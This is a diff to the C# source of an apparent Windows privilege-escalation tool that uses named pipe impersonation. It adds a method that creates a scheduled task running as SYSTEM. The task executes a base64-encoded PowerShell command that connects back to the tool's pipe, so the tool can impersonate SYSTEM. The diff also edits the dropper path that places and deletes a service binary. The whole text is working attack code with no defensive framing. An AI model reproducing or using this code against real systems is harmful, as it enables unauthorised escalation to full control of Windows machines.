@@ -93,17 +93,22 @@ namespace NamedPipeImpersonation.Library
                     using (var pipeReader = new StreamReader(pipeServer))
                     using (var hPipe = pipeServer.SafePipeHandle)
                     {
-                        var serviceThread = new Thread(new ThreadStart(ServiceThreadProc));
+                        Thread backgroundThread;
+
+                        if (Globals.MethodId < 2)
+                            backgroundThread = new Thread(new ThreadStart(ServiceThreadProc));
+                        else
+                            backgroundThread = new Thread(new ThreadStart(TaskThreadProc));
 
                         Console.WriteLine("[*] Waiting for client connection...");
 
-                        serviceThread.Start();
+                        backgroundThread.Start();
                         pipeServer.WaitForConnection();
                         pipeMessage = pipeReader.ReadToEnd();
 
                         NativeMethods.SetEvent(Globals.ConnectEventHandle);
-                        NativeMethods.NtClose(Globals.ConnectEventHandle);
                         NativeMethods.NtWaitForSingleObject(Globals.PipeEventHandle, false, IntPtr.Zero);
+                        NativeMethods.NtClose(Globals.PipeEventHandle);
 
                         if (Helpers.CompareIgnoreCase(pipeMessage, "timeout"))
                         {
@@ -241,7 +246,6 @@ namespace NamedPipeImpersonation.Library
 
             Console.WriteLine("[>] Trying to create and start named pipe client service.");
             Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
-
             Thread.Sleep(100);
             hService = Utilities.StartNamedPipeClientService();
 
@@ -254,11 +258,12 @@ namespace NamedPipeImpersonation.Library
             {
                 Console.WriteLine("[+] Named pipe client service is started successfully.");
 
-                if (Globals.UseDropper)
+                if (Globals.MethodId == 1)
                     Console.WriteLine("[*] Service binary @ {0}", Globals.BinaryPath);
             }
 
             ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectEventHandle, false, in timeout);
+            NativeMethods.NtClose(Globals.ConnectEventHandle);
 
             if (ntstatus == Win32Consts.STATUS_TIMEOUT)
             {
@@ -291,7 +296,7 @@ namespace NamedPipeImpersonation.Library
 
             try
             {
-                if (Globals.UseDropper && File.Exists(Globals.BinaryPath))
+                if ((Globals.MethodId == 1) && File.Exists(Globals.BinaryPath))
                 {
                     Console.WriteLine("[>] Deleting service binary.");
                     File.Delete(Globals.BinaryPath);
@@ -305,7 +310,53 @@ namespace NamedPipeImpersonation.Library
             }
 
             NativeMethods.SetEvent(Globals.PipeEventHandle);
-            NativeMethods.NtClose(Globals.PipeEventHandle);
+        }
+
+
+        private static void TaskThreadProc()
+        {
+            NTSTATUS ntstatus;
+            bool bSuccess;
+            var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
+            var poshCode = string.Format(Globals.PoshTemplate, Globals.ServiceName);
+            var args = string.Format("-EncodedCommand {0}",
+                Convert.ToBase64String(Encoding.Unicode.GetBytes(poshCode)));
+            var binpath = "powershell.exe";
+
+            Console.WriteLine("[>] Trying to create and start a SYSTEM task.");
+            Console.WriteLine("    [*] Task Name  : {0}", Globals.ServiceName);
+            Console.WriteLine("    [*] Executable : {0}", binpath);
+            Console.WriteLine("    [*] Arguments  : {0}", args);
+
+            bSuccess = Utilities.CreateSystemExecTask(
+                Globals.ServiceName,
+                binpath,
+                args,
+                out Exception exception);
+
+            if (bSuccess)
+                Console.WriteLine("[+] SYSTEM task is created, run and deleted successfully.");
+            else
+                Console.WriteLine("[-] Failed to create SYSTEM task: {0}", exception.Message);
+
+            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectEventHandle, false, in timeout);
+            NativeMethods.NtClose(Globals.ConnectEventHandle);
+
+            if (ntstatus == Win32Consts.STATUS_TIMEOUT)
+            {
+                try
+                {
+                    using (var pipeClient = new NamedPipeClientStream(".", Globals.ServiceName, PipeDirection.Out))
+                    {
+                        var message = Encoding.ASCII.GetBytes("timeout");
+                        pipeClient.Connect(3000);
+                        pipeClient.Write(message, 0, message.Length);
+                    }
+                }
+                catch { }
+            }
+
+            NativeMethods.SetEvent(Globals.PipeEventHandle);
         }
     }
 }
